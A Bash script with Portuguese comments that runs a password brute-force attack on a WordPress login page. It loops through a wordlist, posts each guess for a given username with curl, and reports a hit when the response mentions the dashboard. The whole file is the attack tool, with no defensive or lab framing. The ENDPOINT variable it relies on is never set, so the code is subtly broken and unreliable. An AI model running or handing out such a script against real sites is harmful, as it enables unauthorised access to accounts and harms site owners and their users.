#!/bin/bash

# verifica se os parâmetros necessários foram fornecidos
if [ $# -ne 3 ]; then

    echo "Uso: $0 <url> <usuario> <wordlist>"
    echo "Exemplo: $0 http://site.com/wp-login.php admin passwords.txt"
    exit 1
fi

# Parametros
URL=$1
USER=$2
WORDLIST=$3

# Verifica se a wordlist existe
if [ ! -f "$WORDLIST" ]; then
    echo "Erro: Wordlist não encontrada!"
    exit 1
fi

echo "Iniciando ataque de bruteforce no WordPress..."
echo "Alvo: $URL"
echo "Usuário: $USER"
echo "Wordlist: $WORDLIST"
echo "Endpoint: $ENDPOINT"


function brute_force() {
    while read -r PASSWORD; do
        RESPONSE=$(curl -s -X POST "$URL/$ENDPOINT" \
            -d "log=$USER&pwd=$PASSWORD&wp-submit=Log+In" \
            -d "redirect_to=$URL/wp-admin/" -d "testcookie=1")

        if [[ $RESPONSE == *"dashboard"* ]]; then
            echo "[SUCESSO] Senha encontrada: $PASSWORD"
            exit 0
        else
            echo "[FALHA] Tentativa com senha: $PASSWORD"
        fi
    done < "$WORDLIST"
}

brute_force
